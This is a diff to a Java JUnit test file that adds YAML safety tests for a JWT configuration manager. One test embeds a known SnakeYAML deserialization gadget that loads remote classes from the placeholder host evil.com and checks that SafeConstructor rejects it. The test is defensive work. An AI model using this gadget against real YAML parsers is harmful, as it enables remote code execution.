@@ -15,9 +15,7 @@
  */
 package de.cuioss.nifi.processors.auth.config;
 
-import org.junit.jupiter.api.AfterEach;
-import org.junit.jupiter.api.BeforeEach;
-import org.junit.jupiter.api.Test;
+import org.junit.jupiter.api.*;
 import org.junit.jupiter.api.io.TempDir;
 
 import java.io.File;
@@ -267,6 +265,61 @@ class ConfigurationManagerTest {
         Map<String, String> google = configManager.getIssuerProperties("google");
         assertEquals("https://www.googleapis.com/oauth2/v3/certs", google.get("jwksUri"));
         assertEquals("https://accounts.google.com", google.get("issuer"));
+    }
+
+    @Nested
+    @DisplayName("YAML Safety Tests")
+    class YamlSafetyTests {
+
+        @Test
+        @DisplayName("Should reject YAML with custom tags (deserialization attack)")
+        void shouldRejectYamlWithCustomTags() throws IOException {
+            // YAML containing a custom tag that could trigger arbitrary object instantiation
+            String maliciousYaml = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil.com\"]]]]";
+
+            File yamlFile = tempDir.resolve("malicious.yml").toFile();
+            Files.writeString(yamlFile.toPath(), maliciousYaml);
+
+            System.setProperty("jwt.Config.path", yamlFile.getAbsolutePath());
+
+            // Should not throw but should fail to load (SafeConstructor rejects custom tags)
+            assertDoesNotThrow(() -> configManager = new ConfigurationManager());
+            assertFalse(configManager.isConfigurationLoaded(),
+                    "YAML with custom tags should not be loaded successfully");
+        }
+
+        @Test
+        @DisplayName("Should load simple types with SafeConstructor (regression)")
+        void shouldLoadSimpleTypesWithSafeConstructor() throws IOException {
+            // Standard YAML with strings, numbers, lists — should still work
+            String safeYaml = """
+                jwt:
+                  validation:
+                    enabled: true
+                    clockSkew: 60
+                    algorithms:
+                      - RS256
+                      - ES256
+                    issuers:
+                      - id: safe-issuer
+                        jwksUri: https://example.com/jwks
+                """;
+
+            File yamlFile = tempDir.resolve("safe.yml").toFile();
+            Files.writeString(yamlFile.toPath(), safeYaml);
+
+            System.setProperty("jwt.Config.path", yamlFile.getAbsolutePath());
+            configManager = new ConfigurationManager();
+
+            assertTrue(configManager.isConfigurationLoaded(),
+                    "Standard YAML with safe types should load successfully");
+            assertEquals("true", configManager.getProperty("jwt.validation.enabled"));
+            assertEquals("60", configManager.getProperty("jwt.validation.clockSkew"));
+            assertEquals("RS256,ES256", configManager.getProperty("jwt.validation.algorithms"));
+
+            Map<String, String> issuer = configManager.getIssuerProperties("safe-issuer");
+            assertEquals("https://example.com/jwks", issuer.get("jwksUri"));
+        }
     }
 
     @Test
